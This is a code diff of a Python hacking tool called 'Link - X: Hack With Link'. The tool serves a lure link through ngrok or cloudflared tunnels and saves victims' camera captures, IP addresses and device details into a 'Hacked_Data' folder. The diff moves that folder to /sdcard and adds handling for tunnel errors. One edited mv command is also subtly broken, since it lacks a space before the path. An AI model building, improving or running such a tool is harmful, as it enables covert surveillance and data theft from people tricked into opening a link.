@@ -1,4 +1,4 @@
-##### About Tool #####
+##### About Tool ####
 # Link - X    :    Hack With Link
 # Author     :    ToxicNoob
 # Version    :    1.0
@@ -328,8 +328,8 @@ def get_ip():
 def get_log():
     method = menu.method
     body = str(time.time())
-    if not os.path.exists("Hacked_Data"):
-        os.mkdir("Hacked_Data")
+    if not os.path.exists("/sdcard/Hacked_Data"):
+        os.mkdir("/sdcard/Hacked_Data")
     if (method == "camera"):
         exte = ".png"
         head = "cam_"
@@ -366,7 +366,7 @@ def get_log():
             elif (head == "details_"):
                 data = open(".server/upload/data.json").read().replace("[", "").replace("]", "")
                 print_details(data)
-            os.system("mv .server/upload/*"+exte+" Hacked_Data/"+head+body+exte)
+            os.system("mv .server/upload/*"+exte+"/sdcard/Hacked_Data/"+head+body+exte)
             
 
 
@@ -391,12 +391,17 @@ def cloudflare():
     except:
         os.system("./.server/cloudflared tunnel -url \""+host+"\":\""+port+"\" --logfile .cld.log > /dev/null 2>&1 &")
     time.sleep(8)
-    cld_data = open(".cld.log", "r").readlines()
-    line = 1
-    data = cld_data[line]
-    while not ".trycloudflare.com" in data:
-        line = line+1
+    try:
+        cld_data = open(".cld.log", "r").readlines()
+        line = 1
         data = cld_data[line]
+        while not ".trycloudflare.com" in data:
+            line = line+1
+            data = cld_data[line]
+    except:
+        psb("\n\033[92m    [\033[91m!\033[92m] There is a Probleam with Cloudflared Server...!!")
+        psb("\n\033[92m    [\033[91m!\033[92m] Try Using Ngrok Instade or Try Again After Some Time...!!\n")
+        sys.exit()
     head = data.find("https://")
     tail = data.find(".trycloudflare.com")
     url_data = data[head:tail]
@@ -415,6 +420,10 @@ def ngrok():
         os.system("cd .server && ./ngrok http \""+host+"\":\""+port+"\" > /dev/null 2>&1 &")
     time.sleep(8)
     url_data = sb.getoutput("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o \"https://[-0-9a-z]*\.ngrok.io\"")
+    if (url_data == ""):
+        psb("\n\033[92m    [\033[91m!\033[92m] There is a Probleam with Ngrok Server...!!")
+        psb("\n\033[92m    [\033[91m!\033[92m] Try Using Cloudflared Instade or Try Again After Some Time...!!\n")
+        sys.exit()
     return url_data
 
 #TunnelMenu
@@ -509,7 +518,10 @@ def menu():
     elif (op == "#"):
         logout()
 
-#MainProcess#
+
+
+    
+###MainProcess###
 if __name__ == "__main__":
     if not os.path.exists(".server/ngrok") or not os.path.exists(".server/cloudflared"):
         os.system("bash setup.sh")
